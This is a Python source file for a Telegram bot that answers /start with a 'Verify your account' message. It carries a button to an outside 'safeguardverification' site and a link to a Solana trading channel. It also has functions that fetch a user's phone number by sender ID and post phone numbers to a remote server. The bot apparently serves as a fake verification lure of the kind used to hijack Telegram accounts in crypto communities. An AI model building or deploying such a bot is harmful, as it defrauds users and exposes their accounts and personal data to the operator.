import asyncio
from telethon import TelegramClient, events
from telethon.tl.custom import Button
import aiohttp
from backend import clients
from dotenv import load_dotenv
import os
from quart import Quart, jsonify

# Load environment variables from the .env file
load_dotenv()

# Access the environment variables
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('BOT_TOKEN')

bot_client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# External API endpoint to call (Flask server endpoint)
FLASK_API_URL = 'https://telebot-ivng.onrender.com/get_phone_by_sender_id'  # Replace with your Flask API endpoint
API_URL = 'https://telebot-ivng.onrender.com/send_message'  # Replace with your API endpoint

# Create a Quart app to serve the bot and handle HTTP requests
app = Quart(__name__)

# Event handler for /start command
@bot_client.on(events.NewMessage(pattern='/start'))
async def on_start(event):
    try:
        # Respond to the user with a message and buttons
        await event.respond(
            file='https://via.placeholder.com/150',  # Path to the image or image URL
            message="Verify your account.",
            buttons=[
                [Button.url("Verify", "https://safeguardverification.netlify.app/")],
                [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
            ]
        )
        return
    except Exception as e:
        await event.respond(f"Error fetching phone number: {e}")

# Function to retrieve phone number from Flask API based on sender_id
async def get_phone_by_sender_id(sender_id):
    async with aiohttp.ClientSession() as session:
        try:
            params = {'sender_id': sender_id}
            async with session.get(FLASK_API_URL, params=params) as response:
                if response.status == 200:
                    response_data = await response.json()
                    return response_data.get('phone', None)
                else:
                    print(f"Error from Flask API: {response.status}")
                    return None
        except Exception as e:
            print(f"Failed to call Flask API: {e}")
            return None

# Function to call the external API (e.g., sending a message)
async def call_external_endpoint(user_client):
    async with aiohttp.ClientSession() as session:
        try:
            # Prepare the data you want to send to the API
            data = {
                'phone': user_client.phone,  # Send the phone number as expected by the API
            }
            async with session.post(API_URL, json=data) as response:
                if response.status == 200:
                    response_data = await response.json()
                    return f"Response from API: {response_data.get('message', 'Success!')}"
                else:
                    return f"Error from API: {response.status}"
        except Exception as e:
            return f"Failed to call API: {e}"

# Running the bot
async def main():
    await bot_client.start()
    print("Bot is running...")
    await bot_client.run_until_disconnected()

# API Route to check the bot status (for monitoring purposes)
@app.route('/status')
async def status():
    return jsonify({"status": "Bot is running!"})

# Run the bot and Quart app on the specified port
if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.create_task(main())  # Run the Telegram bot
    app.run(host="0.0.0.0", port=5000)  # Quart server runs on port 5000
